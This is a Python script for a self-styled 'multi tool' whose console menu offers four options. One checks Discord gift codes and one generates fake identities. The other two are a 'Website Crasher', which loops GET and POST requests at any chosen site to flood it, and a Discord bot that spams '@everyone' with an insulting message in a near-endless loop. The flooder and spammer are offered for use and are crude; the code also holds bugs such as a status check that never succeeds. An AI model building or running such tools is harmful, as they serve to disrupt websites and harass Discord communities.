import random
import colorama
import time
import datetime
import threading
import os
from datetime import datetime
from colorama import Fore
import httpx
import faker
import discord
from discord.ext import commands
from faker import Faker
randnum = random.randint(000000, 999999999999999)
def tool(randnum):
    faker = Faker()
    red = Fore.RED
    green = Fore.GREEN
    yellow = Fore.YELLOW
    blue = Fore.BLUE
    plus = '[+]'
    minus = '[-]'
    what = '[?]'
    current = datetime.now().strftime("%H:%M:%S")
    os.system("cls")
    print(f'''
{blue}███╗   ███╗██╗   ██╗██╗  ████████╗██╗    ████████╗ ██████╗  ██████╗ ██╗     
████╗ ████║██║   ██║██║  ╚══██╔══╝██║    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
{green}██╔████╔██║██║   ██║██║     ██║   ██║       ██║   ██║   ██║██║   ██║██║     
██║╚██╔╝██║██║   ██║██║     ██║   ██║       ██║   ██║   ██║██║   ██║██║     
{yellow}██║ ╚═╝ ██║╚██████╔╝███████╗██║   ██║       ██║   ╚██████╔╝╚██████╔╝███████╗
╚═╝     ╚═╝ ╚═════╝ ╚══════╝╚═╝   ╚═╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
{red}{plus} {green}Discord Promotion Checker - 1             {red}{plus} {blue}Website Crasher - 2\n\n{red}{plus} {yellow}Fake Adress Generator - 3                 {red}{plus} Discord Spammer - 4                                                        ''')
    print('')
    choice = input(f'{red}{current} {what} {blue}Input Your Choice Here - ')
    if choice == '1':
        os.system('cls')
        promo = input(f'{red}{current} {what} {blue} Promo Code To Check? - ')
        code = promo.split("https://promos.discord.gg/")[1]
        r = httpx.get(f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}")
        if r.status_code == '200':
            print(f"{green}{current} {plus} {blue}Code {code} Is Vaild")
        else:
            print(f"{red}{current} {minus} Invaild Code {code}")
    if choice == '2':
        os.system('cls')
        website = input(f"{blue}{current} {what} {green}Which Website You Want To Crash(send packages) - ")
        amount = input(f"{blue}{current} {what} {green}How Much Packages You Want To Sent? - ")
        amnt = int(amount)
        data = None
        packages_sent = 0
        for ps in range(amnt):
         rs = httpx.get(website)
         es = httpx.post(website, data=data)
         packages_sent += 1
         user_id = random.randint(00000000, 99999999999999)
         print(f"{green}{current} {plus} {blue}Package Sent To {website} | {packages_sent} Packages Are Sent | user_id = {user_id}")
    if choice == '3':
        os.system('cls')
        print('Generating....')
        time.sleep(2)
        print(f'Name: {faker.name()}')
        print(f'First name: {faker.first_name()}')
        print(f'Last name: {faker.last_name()}')

        print('--------------------------')

        print(f'Male name: {faker.name_male()}')
        print(f'Female name: {faker.name_female()}')
        print(f'Adress: {faker.address()}')
        print(f'Text: {faker.text()}')
        time.sleep(10)
    if choice == '4':
        os.system('cls')
        bot = commands.Bot(command_prefix="?", intents=discord.Intents.all())
        token = input(f"{red}{plus} {green}Input Bot Token - ")
        @bot.event
        async def on_ready():
            print(f"{green}{plus} {blue} Bot Is Online Now")
        @bot.command()
        async def spam(ctx):
            for i in range(999999999999):
                sent = 0
                await ctx.send("@everyone Fucked By Blackwool")
                sent += 1
                print(f"{blue}{plus} {green}Sent {sent} Messages")
        bot.run(token)
tool(randnum)